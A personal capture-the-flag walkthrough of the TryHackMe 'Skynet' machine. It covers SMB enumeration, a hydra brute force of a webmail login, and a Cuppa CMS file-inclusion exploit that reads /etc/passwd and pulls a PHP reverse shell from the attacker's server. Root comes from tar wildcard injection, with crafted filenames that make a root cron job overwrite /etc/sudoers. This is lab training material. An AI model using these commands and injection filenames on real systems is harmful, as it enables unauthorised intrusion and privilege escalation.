---
parent: "[[CTFs - THM]]"
---
```bash
# PLATFORM          . THM
# CTF NAME          . Skynet
# DESCRIPTION       . A vulnerable Terminator themed Linux machine.
# DIFFICULTY        . Easy
# CTF LINK          . https://tryhackme.com/room/skynet
```

```bash
sudo nmap -sSVC -T5 10.10.54.6 -p- -oN Skynet
```

```
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 992331bbb1e943b756944cb9e82146c5 (RSA)
|   256 57c07502712d193183dbe4fe679668cf (ECDSA)
|_  256 46fa4efc10a54f5757d06d54f6c34dfe (ED25519)

80/tcp  open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Skynet

110/tcp open  pop3        Dovecot pop3d
|_pop3-capabilities: PIPELINING SASL TOP UIDL CAPA AUTH-RESP-CODE RESP-CODES

139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)

143/tcp open  imap        Dovecot imapd
|_imap-capabilities: more Pre-login have IMAP4rev1 post-login LOGIN-REFERRALS SASL-IR LOGINDISABLEDA0001 capabilities ENABLE listed LITERAL+ IDLE ID OK

445/tcp open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
Service Info: Host: SKYNET; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

- While the `nmap` scan was running, I took a look on the webserver running on port `:80`. The main page seems to be some sort of search engine, but it doesn't seem to be working O_o

- Since currently I didn't have too much information available, I tried enumerating the `smb` service once the `nmap` scan finished.

```bash
smbclient -L \\\\10.10.54.6
```

- When prompted for a password, I just typed `anonymous`.

```bash
	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	anonymous       Disk      Skynet Anonymous Share
	milesdyson      Disk      Miles Dyson Personal Share
	IPC$            IPC       IPC Service (skynet server (Samba, Ubuntu))
```

- Here, we have 2 pieces of useful information:

	- There's a user called Miles Dyson, so we probably got a username here.

	- Skynet has an anonymous share. Let's connect to it.

```bash
smbclient \\\\10.10.54.6\\anonymous
```

```
smb: \> ls
  .                                   D        0  Thu Nov 26 18:04:00 2020
  ..                                  D        0  Tue Sep 17 10:20:17 2019
  attention.txt                       N      163  Wed Sep 18 06:04:59 2019
  logs                                D        0  Wed Sep 18 07:42:16 2019
```

```
smb: \> cd logs
smb: \logs\> ls
  .                                   D        0  Wed Sep 18 07:42:16 2019
  ..                                  D        0  Thu Nov 26 18:04:00 2020
  log2.txt                            N        0  Wed Sep 18 07:42:13 2019
  log1.txt                            N      471  Wed Sep 18 07:41:59 2019
  log3.txt                            N        0  Wed Sep 18 07:42:16 2019
```

- I used `get` to download all the `.txt`  files.

```attention.txt
A recent system malfunction has caused various passwords to be changed. All skynet employees are required to change their password after seeing this.

-Miles Dyson
```

```log1.txt
cyborg007haloterminator
terminator22596
terminator219
terminator20
terminator1989
terminator1988
terminator168
terminator16
terminator143
terminator13
terminator123!@#
terminator1056
terminator101
terminator10
terminator02
terminator00
roboterminator
pongterminator
manasturcaluterminator
exterminator95
exterminator200
dterminator
djxterminator
dexterminator
determinator
cyborg007haloterminator
avsterminator
alonsoterminator
Walterminator
79terminator6
1996terminator
```

- `log1.txt` seems to be a dictionary of passwords. `log2` and `log3.txt` are empty.

- Okay. We got a username and a dictionary of passwords. But where do we use them?

- I tried running `hydra` against the `ssh` service, but with no luck.

- So I have started fuzzing for more endpoints on the webserver.

```
ffuf -u http://10.10.54.6/FUZZ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 100
```

```
admin                   [Status: 301, Size: 308, Words: 20, Lines: 10]
css                     [Status: 301, Size: 306, Words: 20, Lines: 10]
js                      [Status: 301, Size: 305, Words: 20, Lines: 10]
config                  [Status: 301, Size: 309, Words: 20, Lines: 10]
ai                      [Status: 301, Size: 305, Words: 20, Lines: 10]
squirrelmail            [Status: 301, Size: 315, Words: 20, Lines: 10]
server-status           [Status: 403, Size: 275, Words: 20, Lines: 10]
```

- I got a `403 Forbidden` on all endpoints except `squirrelmail`.

- Here, if we take a careful look at the URL, we see that we're already in `/squirrelmail/src/login.php` path.

- I tried fuzzing `/squirrelmail` further to see if there's anything else left.

```
images                  [Status: 301, Size: 322, Words: 20, Lines: 10]
themes                  [Status: 301, Size: 322, Words: 20, Lines: 10]
plugins                 [Status: 301, Size: 323, Words: 20, Lines: 10]
src                     [Status: 301, Size: 319, Words: 20, Lines: 10]
include                 [Status: 403, Size: 275, Words: 20, Lines: 10]
config                  [Status: 301, Size: 322, Words: 20, Lines: 10]
class                   [Status: 403, Size: 275, Words: 20, Lines: 10]
help                    [Status: 403, Size: 275, Words: 20, Lines: 10]
functions               [Status: 403, Size: 275, Words: 20, Lines: 10]
po                      [Status: 403, Size: 275, Words: 20, Lines: 10]
locale                  [Status: 403, Size: 275, Words: 20, Lines: 10]
```

- However, most of these either had a redirect in place that pointed me back to `/src/login.php` or I had no access at all.

- Back to our `login.php` page, we see that here's a login panel. 

- I tried running `hydra` with `miles` and `dyson` as usernames, but I had no luck. Then, I tried with `milesdyson` as username and I got in.

```bash
sudo hydra -l milesdyson -P log1.txt 10.10.54.6 http-post-form "/squirrelmail/src/redirect.php:login_username=milesdyson&secretkey=^PASS^:incorrect." -vv -I
```

- the values `login_username` and `secretkey` are the form names I found while inspecting the front-end of the login panel.

- Once logged in, we have 3 emails.

|   |   |   |   |   |
|---|---|---|---|---|
||**From** [![sort](http://10.10.54.6/squirrelmail/images/sort_none.png)](http://10.10.54.6/squirrelmail/src/right_main.php?newsort=2&startMessage=1&mailbox=INBOX)|**Date** [![sort](http://10.10.54.6/squirrelmail/images/sort_none.png)](http://10.10.54.6/squirrelmail/src/right_main.php?newsort=0&startMessage=1&mailbox=INBOX)||**Subject** [![sort](http://10.10.54.6/squirrelmail/images/sort_none.png)](http://10.10.54.6/squirrelmail/src/right_main.php?newsort=4&startMessage=1&mailbox=INBOX)|
||skynet@skynet|Sep 17, 2019||Samba Password reset|
||   |   |   |   |
||serenakogan@skynet|Sep 17, 2019||(no subject)|
||   |   |   |   |
||serenakogan@skynet|Sep 17, 2019||(no subject)|

```1st_email
We have changed your smb password after system malfunction.
Password: {redacted}`
```

```2nd_email
01100010 01100001 01101100 01101100 01110011 00100000 01101000 01100001 01110110 01100101 00100000 01111010 01100101 01110010 01101111 00100000 01110100 01101111 00100000 01101101 01100101 00100000 01110100 01101111 00100000 01101101 01100101 00100000 01110100 01101111 00100000 01101101 01100101 00100000 01110100 01101111 00100000 01101101 01100101 00100000 01110100 01101111 00100000 01101101 01100101 00100000 01110100 01101111 00100000 01101101 01100101 00100000 01110100 01101111 00100000 01101101 01100101 00100000 01110100 01101111 00100000 01101101 01100101 00100000 01110100 01101111
```

- which represents `balls have zero to me to me to me to me to me to me to me to me to` in binary.

```3rd_email
i can i i everything else . . . . . . . . . . . . . .balls have zero to me to me to me to me to me to me to me to me to you i everything else . . . . . . . . . . . . . .balls have a ball to me to me to me to me to me to me to me i i can i i i everything else . . . . . . . . . . . . . .balls have a ball to me to me to me to me to me to me to me i . . . . . . . . . . . . . . . . . . .balls have zero to me to me to me to me to me to me to me to me to you i i i i i everything else . . . . . . . . . . . . . . balls have 0 to me to me to me to me to me to me to me to me to you i i i everything else . . . . . . . . . . . . . .balls have zero to me to me to me to me to me to me to me to me to
```

- Second email seems to have the same theme as the third one. I had no idea what this meant and I googled the entire content of 3rd email. I found [this](https://languagelog.ldc.upenn.edu/nll/?p=33355) article. Dead end.

- Alright, we can now login as miles in his personal SMB share.

```bash
smbclient \\\\10.10.54.6\\milesdyson -U milesdyson
```

```
smb: \> dir
  .                                   D        0  Tue Sep 17 12:05:47 2019
  ..                                  D        0  Wed Sep 18 06:51:03 2019
  Improving Deep Neural Networks.pdf  N  5743095  Tue Sep 17 12:05:14 2019
  Natural Language Processing.pdf     N 12927230  Tue Sep 17 12:05:14 2019
  Convolutional Neural Networks.pdf   N 19655446  Tue Sep 17 12:05:14 2019
  notes                               D        0  Tue Sep 17 12:18:40 2019
  Neural Networks.pdf                 N  4304586  Tue Sep 17 12:05:14 2019
  Structuring your Machine.pdf        N  3531427  Tue Sep 17 12:05:14 2019

smb: \> cd notes
smb: \notes\> dir
  .                                   D        0  Tue Sep 17 12:18:40 2019
  ..                                  D        0  Tue Sep 17 12:05:47 2019
  3.01 Search.md                      N    65601  Tue Sep 17 12:01:29 2019
  4.01 Agent-Based Models.md          N     5683  Tue Sep 17 12:01:29 2019
  2.08 In Practice.md                 N     7949  Tue Sep 17 12:01:29 2019
  0.00 Cover.md                       N     3114  Tue Sep 17 12:01:29 2019
  1.02 Linear Algebra.md              N    70314  Tue Sep 17 12:01:29 2019
  important.txt                       N      117  Tue Sep 17 12:18:39 2019
  6.01 pandas.md                      N     9221  Tue Sep 17 12:01:29 2019
  3.00 Artificial Intelligence.md     N       33  Tue Sep 17 12:01:29 2019
  2.01 Overview.md                    N     1165  Tue Sep 17 12:01:29 2019
  3.02 Planning.md                    N    71657  Tue Sep 17 12:01:29 2019
  1.04 Probability.md                 N    62712  Tue Sep 17 12:01:29 2019
  2.06 Natural Language.md            N    82633  Tue Sep 17 12:01:29 2019
  2.00 Machine Learning.md            N       26  Tue Sep 17 12:01:29 2019
  1.03 Calculus.md                    N    40779  Tue Sep 17 12:01:29 2019
  3.03 Reinforcement Learning.md      N    25119  Tue Sep 17 12:01:29 2019
  1.08 Probabilistics.md              N    81655  Tue Sep 17 12:01:29 2019
  1.06 Bayesian Statistics.md         N    39554  Tue Sep 17 12:01:29 2019
  6.00 Appendices.md                  N       20  Tue Sep 17 12:01:29 2019
  1.01 Functions.md                   N     7627  Tue Sep 17 12:01:29 2019
  2.03 Neural Nets.md                 N   144726  Tue Sep 17 12:01:29 2019
  2.04 Model Selection.md             N    33383  Tue Sep 17 12:01:29 2019
  2.02 Supervised Learning.md         N    94287  Tue Sep 17 12:01:29 2019
  4.00 Simulation.md                  N       20  Tue Sep 17 12:01:29 2019
  3.05 In Practice.md                 N     1123  Tue Sep 17 12:01:29 2019
  1.07 Graphs.md                      N     5110  Tue Sep 17 12:01:29 2019
  2.07 Unsupervised Learning.md       N    21579  Tue Sep 17 12:01:29 2019
  2.05 Bayesian Learning.md           N    39443  Tue Sep 17 12:01:29 2019
  5.03 Anonymization.md               N     2516  Tue Sep 17 12:01:29 2019
  5.01 Process.md                     N     5788  Tue Sep 17 12:01:29 2019
  1.09 Optimization.md                N    25823  Tue Sep 17 12:01:29 2019
  1.05 Statistics.md                  N    64291  Tue Sep 17 12:01:29 2019
  5.02 Visualization.md               N      940  Tue Sep 17 12:01:29 2019
  5.00 In Practice.md                 N       21  Tue Sep 17 12:01:29 2019
  4.02 Nonlinear Dynamics.md          N    44601  Tue Sep 17 12:01:29 2019
  1.10 Algorithms.md                  N    28790  Tue Sep 17 12:01:29 2019
  3.04 Filtering.md                   N    13360  Tue Sep 17 12:01:29 2019
  1.00 Foundations.md                 N       22  Tue Sep 17 12:01:29 2019

smb: \notes\> get important.txt 

smb: \notes\> exit
```

```important.txt
1. Add features to beta CMS /{redacted}
2. Work on T-800 Model 101 blueprints
3. Spend more time with my wife
```

- Alright. So we find another endpoint. Nothing interesting, so I started fuzzing again :) 

```
administrator           [Status: 301, Size: 333, Words: 20, Lines: 10]
```

- Going to `/{redacted}/administrator` we find that it is running Cuppa CMS.

- After some googling, I found [this](https://www.exploit-db.com/exploits/25971) exploit for Cuppa CMS that allows for LFI - Local File Inclusion attacks.

- It seems that the payload works like this:

```
ip/{redacted}/administrator/alerts/alertConfigField.php?urlConfig=[command]
```

eg: 

```
http://10.10.54.6/{redacted}/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../etc/passwd

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
lxd:x:106:65534::/var/lib/lxd/:/bin/false
messagebus:x:107:111::/var/run/dbus:/bin/false
uuidd:x:108:112::/run/uuidd:/bin/false
dnsmasq:x:109:65534:dnsmasq,,,:/var/lib/misc:/bin/false
sshd:x:110:65534::/var/run/sshd:/usr/sbin/nologin
milesdyson:x:1001:1001:,,,:/home/milesdyson:/bin/bash
dovecot:x:111:119:Dovecot mail server,,,:/usr/lib/dovecot:/bin/false
dovenull:x:112:120:Dovecot login user,,,:/nonexistent:/bin/false
postfix:x:113:121::/var/spool/postfix:/bin/false
mysql:x:114:123:MySQL Server,,,:/nonexistent:/bin/false
```

- My next step was to start a python webserver in a directory where a php reverse shell would be located. 

```bash
ls
shell.php

sudo python3 -m http.server 80
```

- Then, start a listener `rlwrap nc -nvlp 3131`

- Navigate to `http[:]//ip/{redacted}/administrator/alerts/alertConfigField.php?urlConfig=http[:]//yourIP:80/shell.php

- Stabilise the shell

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm

<CTRL + Z>
stty raw -echo; fg
```

```bash
www-data@skynet:/$ whoami
www-data
```

- The first flag is in `/home/milesdyson/user.txt`

- Here is also a `backups` directory

```bash
ls -l backups/

-rwxr-xr-x 1 root root      74 Sep 17  2019 backup.sh
-rw-r--r-- 1 root root 4679680 Nov 25 07:48 backup.tgz
```

```bash
www-data@skynet:/home/milesdyson$ cat backups/backup.sh 

#!/bin/bash
cd /var/www/html
tar cf /home/milesdyson/backups/backup.tgz *
```

- There is also a `cronjob` in `/etc/crontab` that will run the `backup.sh` file as root.

- We see that the last command is `tar cf` and it'll run as root. `tar` can be used to escalate privileges if given acces to by spawning a shell

`tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh`

- What are we going to do, is to create the additional parameters as names in the `/var/www/html` directory, where it'll read files from, as root.

```bash
echo 'echo "www-data ALL=(root) NOPASSWD: ALL" > /etc/sudoers' > magic.sh
echo "/var/www/html"  > "--checkpoint-action=exec=sh magic.sh"
echo "/var/www/html"  > --checkpoint=1
```

- This will make www-data a member of the `sudoers` group and we will be able to run `sudo su` in a few moments.

```bash
echo "/var/www/html"  > "--checkpoint-action=exec=/bin/sh"
echo "/var/www/html"  > --checkpoint=1
```

- spawn a shell under root.

- I choose the 1st method and I was able to change to root by running `sudo su`. 

- The last flag is in `/root/root.txt`